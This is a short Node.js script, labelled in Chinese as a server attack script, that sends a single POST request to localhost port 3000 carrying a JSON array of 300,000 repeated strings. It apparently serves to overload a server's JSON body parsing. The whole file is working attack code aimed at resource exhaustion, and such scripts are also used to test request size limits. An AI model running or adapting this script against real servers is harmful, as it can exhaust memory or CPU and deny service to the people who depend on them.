// 服务器攻击脚本
const http = require('http');

const req = http.request({
  method: 'POST',
  port: 3000,
  headers: {
    'Content-Type': 'application/json'
  },
});

req.write('[');
let n = 300000;
while (n--) {
  req.write('"foo",');
}
req.write('"bar"]');

req.end();